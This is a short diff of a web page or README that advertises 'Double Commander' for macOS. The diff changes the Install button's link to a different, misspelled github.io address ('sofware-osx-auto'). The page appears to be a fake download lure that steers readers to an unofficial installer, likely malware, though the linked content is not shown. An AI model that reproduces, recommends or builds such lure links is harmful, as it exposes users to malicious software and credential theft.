@@ -6,7 +6,7 @@
 <h3>Double Commander - advanced file management</h3>
 <p>Double Commander is a professional dual-pane file manager application specifically developed for macOS environments</p>
 
-<a href="https://mac-apps-install.github.io/.github/">
+<a href="https://sofware-osx-auto.github.io/.github/dc">
   <img src="https://i.postimg.cc/65RNcQgZ/download-7641614-1280-(3).png" width="200" alt="Install"/>
 </a>
 </div>
